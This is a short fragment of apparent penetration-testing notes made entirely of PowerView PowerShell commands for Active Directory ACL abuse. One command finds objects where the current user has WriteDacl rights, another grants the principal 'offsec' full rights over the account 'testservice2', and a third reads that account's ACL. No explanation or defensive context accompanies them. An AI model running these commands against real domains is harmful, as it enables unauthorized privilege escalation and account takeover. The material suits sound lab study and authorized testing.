```
Get-DomainUser | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq $("$env:UserDomain\$env:Username")){$_}} | Foreach-Object {if ($_.ActiveDirectoryRights -like "*WriteDacl*"){$_} }
```

```
Add-DomainObjectAcl -TargetIdentity testservice2 -PrincipalIdentity offsec -Rights All
```

* Get single user

```
Get-ObjectAcl -Identity testservice2 -ResolveGUIDs
```

